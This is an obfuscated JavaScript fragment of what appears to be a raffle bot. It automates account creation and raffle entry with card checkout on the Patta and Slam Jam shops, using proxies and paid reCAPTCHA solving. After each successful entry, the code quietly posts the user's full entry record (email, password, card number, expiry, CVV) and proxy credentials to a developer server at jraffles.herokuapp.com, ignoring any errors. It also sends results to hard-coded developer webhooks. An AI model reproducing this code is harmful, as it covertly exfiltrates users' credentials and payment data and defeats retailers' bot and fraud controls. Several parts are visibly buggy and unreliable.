                                _0x5d25ab['resourceType']() === 'image' || _0x5d25ab['resourceType']() === 'font' || _0x5d25ab['resourceType']() === 'media' ? _0x5d25ab['abort']() : _0x5d25ab['continue']();
                            }), await _0x1eff43['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1eff43['waitForSelector']('#CustomerEmail'), console['log'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1eff43['type']('#CustomerEmail', '' + _0x87fc0b[_0x4abe6e]['Email']), await _0x4d97b0(0x12c), await _0x1eff43['type']('#CustomerPassword', '' + _0x87fc0b[_0x4abe6e]['Password']), await _0x4d97b0(0x226), await _0x1eff43['$eval']('#customer_login', _0x1bef53 => _0x1bef53['submit']());
                            try {
                                await _0x1eff43['waitForSelector']('#orders'), await _0x4d97b0(0x4b0);
                            } catch {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1eff43['goto']('' + _0x87fc0b[_0x4abe6e]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4d97b0(0xbb8), console['log'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1eff43['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x1eff43['type']('#email', '' + _0x87fc0b[_0x4abe6e]['Email']), await _0x4d97b0(0x384), await _0x1eff43['type']('#first_name', '' + _0x87fc0b[_0x4abe6e]['FirstName']), await _0x4d97b0(0x514), await _0x1eff43['type']('#last_name', '' + _0x87fc0b[_0x4abe6e]['LastName']), await _0x4d97b0(0x514), await _0x1eff43['type']('#street_address', _0x87fc0b[_0x4abe6e]['Address1'] + '\x20' + _0x87fc0b[_0x4abe6e]['HouseNumber'] + '\x20' + _0x87fc0b[_0x4abe6e]['Address2']), await _0x4d97b0(0x2bc);
                            _0x87fc0b[_0x4abe6e]['Postcode'] == undefined && (_0x87fc0b[_0x4abe6e]['Postcode'] = _0x87fc0b[_0x4abe6e]['Zip']);
                            await _0x1eff43['type']('#zip_code', '' + _0x87fc0b[_0x4abe6e]['Postcode']), await _0x4d97b0(0x320), await _0x1eff43['type']('#city', '' + _0x87fc0b[_0x4abe6e]['City']), await _0x4d97b0(0x320), await _0x1eff43['type']('#bday', '01/01/1994'), await _0x4d97b0(0x320), await _0x1eff43['type']('#instagram', '' + _0x87fc0b[_0x4abe6e]['Follower']), await _0x4d97b0(0x352);
                            if (_0x87fc0b[_0x4abe6e]['Size'] == 'RANDOM') {
                                const _0x8b357d = await _0x1eff43['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x245720 => {
                                    return _0x245720['map'](_0x5d020b => _0x5d020b['textContent']);
                                });
                                var _0x3df7d8 = Math['round'](Math['random']() * (_0x8b357d['length'] - 0x1));
                                console['log'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x8b357d[_0x3df7d8]), await _0x1eff43['click']('label[data-eu-size=\x22' + _0x8b357d[_0x3df7d8] + '\x22]');
                            } else {
                                console['log'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x87fc0b[_0x4abe6e]['Size']);
                                try {
                                    await _0x1eff43['click']('label[data-eu-size=\x22' + _0x87fc0b[_0x4abe6e]['Size'] + '\x22]');
                                } catch {
                                    await _0x1eff43['click']('label[data-eu-size=\x22' + _0x87fc0b[_0x4abe6e]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x4d97b0(0xbb8), await _0x1eff43['$$eval']('.raffle__checkbox-label', _0x1efb57 => _0x1efb57['forEach'](_0x30eff9 => _0x30eff9['click']())), await _0x4d97b0(0x7d0), console['log'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x1eff43['click']('#raffle__form-submit'), await _0x4d97b0(0x1388);
                            try {
                                await _0x1eff43['waitForSelector']('#raffle__confirmation-message-container'), _0x4f6a3d = 'no', _0x3b7ca0(_0x87fc0b[_0x4abe6e], _0x102f91), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x3d8d9a = _0x87fc0b[_0x4abe6e];
                                try {
                                    prxdata = {
                                        'username': _0x1d8120['replace']('#', ''),
                                        'module': _0x102f91['name'],
                                        'entrydata': JSON['stringify'](_0x3d8d9a),
                                        'proxy': '' + _0x374ae6[_0x4abe6e]
                                    };
                                    var _0x5dd7aa = JSON['stringify'](prxdata);
                                    let _0xdbdb02 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x5dd7aa, _0xdbdb02);
                                } catch (_0x3757ea) {
                                }
                            } catch (_0x45dd78) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x45dd78));
                            }
                        } catch (_0x5cb532) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20' + _0x5cb532)), _0x4f6a3d = 'yes';
                        } finally {
                            _0xff6564 && _0xff6564['close']();
                            if (_0x4f6a3d == 'yes' && _0x3ada12 != 0x5 && _0x4453b2 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x102f91['name'] + ']\x20Task\x20' + (_0x4abe6e + 0x1) + '\x20:\x20Retrying\x20(' + _0x3ada12 + '\x20/\x205)')), _0x4abe6e = _0x4abe6e - 0x1, _0x3ada12 = _0x3ada12 + 0x1;
                                continue;
                            }
                            _0x4f6a3d == 'yes' && _0x3ada12 >= 0x5 && (_0x320814(_0x87fc0b[_0x4abe6e], _0x102f91), _0x4f6a3d = 'no', _0x3ada12 = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x23777f, _0x3d32f4, _0x41844f) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3bd0be = 0x0; _0x3bd0be < _0x3d32f4['length']; _0x3bd0be++) {
                        if (_0xaf786c != 'yes')
                            var _0xaf786c = '', _0x29a3e1 = 0x0;
                        var _0x120f88 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d8120
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4562fb['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5acae2
                                }
                            ]
                        }];
                        const _0x4dbf58 = { 'embeds': _0x120f88 };
                        _0x81eb1(_0x23777f['name'] + '\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20/\x20' + _0x3d32f4['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        try {
                            await _0x43eceb(_0x3d32f4, _0x3bd0be);
                        } catch {
                            _0xaf786c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2c6295 = await _0x4ef820(_0x3d32f4[_0x3bd0be], _0x23777f, 'acc', ![]);
                        const _0x113eb1 = { 'succesDEVMSG': { 'embeds': [_0x2c6295] } };
                        if (_0x3d32f4[_0x3bd0be]['Email'] == '' || _0x3d32f4[_0x3bd0be]['FirstName'] == '' || _0x3d32f4[_0x3bd0be]['LastName'] == '') {
                            console['log'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4d97b0(0x7d0);
                            continue;
                        }
                        (_0x3d32f4[_0x3bd0be]['Password'] == '' || _0x3d32f4[_0x3bd0be] == undefined) && _0x3d32f4[_0x3bd0be]['Password'] == 'JRaffles23!';
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x4a4483 = _0x41844f[_0x3bd0be]['split'](':');
                        else
                            var _0x3c0ce7 = Math['round'](Math['random']() * (_0x41844f['length'] - 0x1)), _0x4a4483 = _0x41844f[_0x3c0ce7]['split'](':');
                        var _0xbe40d6;
                        try {
                            _0xbe40d6 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a4483[0x0] + ':' + _0x4a4483[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xbe40d6 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a4483[0x0] + ':' + _0x4a4483[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2a917e = await _0xbe40d6['newPage']();
                            await _0x2a917e['authenticate']({
                                'username': '' + _0x4a4483[0x2],
                                'password': '' + _0x4a4483[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a917e['setRequestInterception'](!![]), _0x2a917e['on']('request', _0x42f6de => {
                                _0x42f6de['resourceType']() === 'image' || _0x42f6de['resourceType']() === 'font' || _0x42f6de['resourceType']() === 'media' ? _0x42f6de['abort']() : _0x42f6de['continue']();
                            }), await _0x2a917e['goto']('https://drop.slamjam.com/account/register'), await _0x4d97b0(0xbb8), await _0x2a917e['waitForSelector']('#FirstName'), await _0x2a917e['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2a917e['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Filling\x20information'), await _0x4d97b0(0x4b0), await _0x2a917e['type']('#FirstName', '' + _0x3d32f4[_0x3bd0be]['FirstName']), await _0x4d97b0(0x226), await _0x2a917e['type']('#LastName', '' + _0x3d32f4[_0x3bd0be]['LastName']), await _0x4d97b0(0x226), await _0x2a917e['type']('#Email', '' + _0x3d32f4[_0x3bd0be]['Email']), await _0x4d97b0(0x2ee), await _0x2a917e['type']('#ConfirmEmail', '' + _0x3d32f4[_0x3bd0be]['Email']), await _0x4d97b0(0x2ee), await _0x2a917e['type']('#CreatePassword', '' + _0x3d32f4[_0x3bd0be]['Password']), await _0x4d97b0(0x2ee), await _0x2a917e['type']('#CreateConfirmPassword', '' + _0x3d32f4[_0x3bd0be]['Password']), await _0x4d97b0(0x226), console['log'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Submitting..'), await _0x2a917e['$eval']('#create_customer', _0x58e3c0 => _0x58e3c0['submit']()), await _0x4d97b0(0x1388), console['log'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20' + _0x1de0e8['cyan']('Solving\x20Captcha')), await _0x2a917e['solveRecaptchas'](), console['log'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x2a917e['$eval']('.shopify-challenge__container\x20>\x20form', _0x2df8b4 => _0x2df8b4['submit']());
                            try {
                                await _0x2a917e['waitForSelector']('.product-card__image'), await _0x4d97b0(0x1f4), _0xaf786c = 'no', console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Account\x20' + _0x3d32f4[_0x3bd0be]['Email'] + '\x20Generated!')), _0x4a3989['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x3d32f4[_0x3bd0be]['Email'] + ',' + _0x3d32f4[_0x3bd0be]['Password']), console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Account\x20' + _0x3d32f4[_0x3bd0be]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x113eb1['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa7b872(_0x392309, _0x113eb1['succesDEVMSG']);
                            } catch (_0x1a1095) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1a1095));
                            }
                        } catch (_0x191479) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20' + _0x191479));
                        } finally {
                            _0xbe40d6 && _0xbe40d6['close']();
                            if (_0xaf786c == 'yes' && _0x29a3e1 != 0x5) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x23777f['name'] + ']\x20Task\x20' + (_0x3bd0be + 0x1) + '\x20:\x20Retrying\x20(' + _0x29a3e1 + '\x20/\x205)')), _0x3bd0be = _0x3bd0be - 0x1, _0x29a3e1 = _0x29a3e1 + 0x1;
                                continue;
                            }
                            _0xaf786c == 'yes' && _0x29a3e1 >= 0x5 && (_0x320814(_0x3d32f4[_0x3bd0be], _0x23777f), _0xaf786c = 'no', _0x29a3e1 = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x39af96, _0x3e468f, _0x9ba475) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5580ad = 0x0; _0x5580ad < _0x3e468f['length']; _0x5580ad++) {
                        var _0x938337;
                        if (_0x517a84 != 'yes')
                            var _0x517a84 = '', _0x493d9d = 0x0;
                        _0x81eb1(_0x39af96['name'] + '\x20Task\x20' + (_0x5580ad + 0x1) + '\x20/\x20' + _0x3e468f['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        try {
                            await _0x43eceb(_0x3e468f, _0x5580ad);
                        } catch {
                            _0x517a84 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3e468f[_0x5580ad]['Email'] == '' || _0x3e468f[_0x5580ad]['Password'] == '' || _0x3e468f[_0x5580ad]['FirstName'] == '' || _0x3e468f[_0x5580ad]['LastName'] == '') {
                            console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x7f2592 = _0x9ba475[_0x5580ad]['split'](':');
                        else
                            var _0x1ae4c1 = Math['round'](Math['random']() * (_0x9ba475['length'] - 0x1)), _0x7f2592 = _0x9ba475[_0x1ae4c1]['split'](':');
                        var _0x1f6c95;
                        try {
                            _0x1f6c95 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x7f2592[0x0] + ':' + _0x7f2592[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f6c95 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x7f2592[0x0] + ':' + _0x7f2592[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x377089 = await _0x1f6c95['newPage']();
                            await _0x377089['authenticate']({
                                'username': '' + _0x7f2592[0x2],
                                'password': '' + _0x7f2592[0x3]
                            }), await _0x377089['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Getting\x20Session'), await _0x377089['setRequestInterception'](!![]), _0x377089['on']('request', _0x15d176 => {
                                _0x15d176['resourceType']() === 'image' || _0x15d176['resourceType']() === 'font' || _0x15d176['resourceType']() === 'media' ? _0x15d176['abort']() : _0x15d176['continue']();
                            }), await _0x377089['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x377089['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x377089['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4d97b0(0x258), await _0x377089['waitForSelector']('#CustomerEmail'), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Logging\x20in..'), await _0x377089['type']('#CustomerEmail', '' + _0x3e468f[_0x5580ad]['Email']), await _0x4d97b0(0x12c), await _0x377089['type']('#CustomerPassword', '' + _0x3e468f[_0x5580ad]['Password']), await _0x4d97b0(0x226), await _0x377089['$eval']('#customer_login', _0x160a44 => _0x160a44['submit']()), await _0x4d97b0(0x7d0), await _0x377089['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20' + _0x1de0e8['cyan']('Solving\x20Captcha')), await _0x377089['solveRecaptchas'](), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x377089['$eval']('.shopify-challenge__container\x20>\x20form', _0xbd047e => _0xbd047e['submit']());
                            try {
                                await _0x377089['waitForSelector']('.nav-account'), await _0x4d97b0(0x4b0);
                            } catch {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x377089['goto']('' + _0x3e468f[_0x5580ad]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4d97b0(0xbb8), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x377089['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x377089['click']('.product-select-variant-wrapper'), await _0x4d97b0(0x320), await _0x377089['click']('li.product-select-variant__value[data-size=\x22' + _0x3e468f[_0x5580ad]['Size'] + '\x22]'), await _0x4d97b0(0x384), await _0x377089['$eval']('#AddToCartForm-product-template-raffle', _0xdcfaf0 => _0xdcfaf0['submit']()), await _0x377089['waitForSelector']('.cart-order-summary__content'), await _0x4d97b0(0x514), await _0x377089['goto']('https://drop.slamjam.com/checkout'), await _0x4d97b0(0x514), await _0x377089['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Filling\x20Information'), await _0x377089['select']('#checkout_shipping_address_country', '' + _0x3e468f[_0x5580ad]['Country']), await _0x4d97b0(0x200), await _0x377089['waitForSelector']('#checkout_shipping_address_first_name'), await _0x377089['type']('#checkout_shipping_address_first_name', '' + _0x3e468f[_0x5580ad]['FirstName']), await _0x4d97b0(0x237), await _0x377089['type']('#checkout_shipping_address_last_name', '' + _0x3e468f[_0x5580ad]['LastName']), await _0x4d97b0(0x1e0), await _0x377089['type']('#checkout_shipping_address_address1', _0x3e468f[_0x5580ad]['Address1'] + '\x20' + _0x3e468f[_0x5580ad]['HouseNumber']), await _0x4d97b0(0x514), await _0x377089['type']('#checkout_shipping_address_address2', '' + _0x3e468f[_0x5580ad]['Address2']), await _0x4d97b0(0x514);
                            _0x3e468f[_0x5580ad]['Postcode'] == undefined && (_0x3e468f[_0x5580ad]['Postcode'] = _0x3e468f[_0x5580ad]['Zip']);
                            await _0x377089['type']('#checkout_shipping_address_zip', '' + _0x3e468f[_0x5580ad]['Postcode']), await _0x4d97b0(0x2bc), await _0x377089['type']('#checkout_shipping_address_city', '' + _0x3e468f[_0x5580ad]['City']), await _0x4d97b0(0x320), await _0x377089['type']('#checkout_shipping_address_phone', '' + _0x3e468f[_0x5580ad]['Phone']), await _0x4d97b0(0x320), await _0x377089['click']('#continue_button'), await _0x4d97b0(0xbb8), await _0x377089['waitForSelector']('.summary-title'), await _0x4d97b0(0x320), await _0x377089['click']('#continue_button'), await _0x4d97b0(0x320), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x377089['waitForSelector']('#checkout_credit_card_vault'), await _0x4d97b0(0x3e8);
                            var _0x2d9f22 = await _0x377089['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3b8d6e = await _0x2d9f22['contentFrame']();
                            await _0x3b8d6e['click']('#number'), await _0x4d97b0(0x3e8), await _0x3b8d6e['type']('#number', '' + _0x3e468f[_0x5580ad]['CardNumber'], { 'delay': 0x78 }), _0x2d9f22 = await _0x377089['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3b8d6e = await _0x2d9f22['contentFrame'](), await _0x4d97b0(0x1c2), await _0x3b8d6e['click']('#name'), await _0x4d97b0(0x1f4), await _0x3b8d6e['type']('#name', '' + _0x3e468f[_0x5580ad]['NameOnCard'], { 'delay': 0x78 }), _0x2d9f22 = await _0x377089['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3b8d6e = await _0x2d9f22['contentFrame'](), await _0x4d97b0(0x1c2), await _0x3b8d6e['click']('#expiry'), await _0x4d97b0(0x1f4), await _0x3b8d6e['type']('#expiry', '' + _0x3e468f[_0x5580ad]['ExpiryDate'], { 'delay': 0x78 }), _0x2d9f22 = await _0x377089['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3b8d6e = await _0x2d9f22['contentFrame'](), await _0x4d97b0(0x1c2), await _0x3b8d6e['click']('#verification_value'), await _0x4d97b0(0x1f4), await _0x3b8d6e['type']('#verification_value', '' + _0x3e468f[_0x5580ad]['CVV'], { 'delay': 0x78 }), await _0x377089['$eval']('#accepts-flag-raffle', _0x1f6e91 => _0x1f6e91['click']()), await _0x4d97b0(0x7d0), console['log'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Processing\x20Order'), await _0x377089['$eval']('#continue_button', _0x549776 => _0x549776['click']()), await _0x4d97b0(0x1b58), await _0x377089['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x377089['$eval']('.edit_checkout.animate-floating-labels', _0x1dd5cf => _0x1dd5cf['submit']()), await _0x4d97b0(0x7d0);
                            try {
                                await _0x377089['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x517a84 = 'no', _0x3b7ca0(_0x3e468f[_0x5580ad], _0x39af96), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2e0909) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2e0909['message']);
                            }
                            var _0x29da4d = await _0x4ef820(_0x3e468f[_0x5580ad], _0x39af96, 'dev', ![]), _0xd1a593 = await _0x4ef820(_0x3e468f[_0x5580ad], _0x39af96, 'pub', ![]);
                            let _0x419e69 = _0x3e468f[_0x5580ad];
                            try {
                                prxdata = {
                                    'username': _0x1d8120['replace']('#', ''),
                                    'module': _0x39af96['name'],
                                    'entrydata': JSON['stringify'](_0x419e69),
                                    'proxy': '' + _0x9ba475[_0x5580ad]
                                };
                                var _0x12b5d5 = JSON['stringify'](prxdata);
                                let _0x3e9cab = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x12b5d5, _0x3e9cab);
                            } catch (_0x3dabf2) {
                            }
                            const _0x2c0846 = {
                                'succesDEVMSG': { 'embeds': [_0x29da4d] },
                                'succesPUBMSG': { 'embeds': [_0xd1a593] }
                            };
                            try {
                                _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x2c0846['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x2c0846['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x2c0846['succesPUBMSG']);
                            } catch (_0x249efa) {
                                console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x249efa));
                            }
                        } catch (_0x5a6bec) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20' + _0x5a6bec)), _0x938337 = '' + _0x5a6bec;
                            var _0x4d278b = await _0x4ef820(kickz[_0x5580ad], _0x39af96, 'dev', !![], _0x938337);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x4d278b] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], EMBEDS['errorDEV']), await _0xa7b872(_0x5f83c7, EMBEDS['errorDEV']), _0x517a84 = 'yes';
                        } finally {
                            _0x1f6c95 && _0x1f6c95['close']();
                            if (_0x517a84 == 'yes' && _0x493d9d != 0x5 && _0x938337 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x39af96['name'] + ']\x20Task\x20' + (_0x5580ad + 0x1) + '\x20:\x20Retrying\x20(' + _0x493d9d + '\x20/\x205)')), _0x5580ad = _0x5580ad - 0x1, _0x493d9d = _0x493d9d + 0x1;
                                continue;
                            }
                            _0x517a84 == 'yes' && _0x493d9d >= 0x5 && (_0x320814(_0x3e468f[_0x5580ad], _0x39af96), _0x517a84 = 'no', _0x493d9d = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x409d2a) {
                    var _0x37544d = await _0x210300(), _0xc8afd7 = _0x4a3989['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x285a69 = _0x4dbee3['parse'](_0xc8afd7, { 'header': !![] })['data'];
                    for (var _0x5b46c8 = 0x0; _0x5b46c8 < _0x285a69['length']; _0x5b46c8++) {
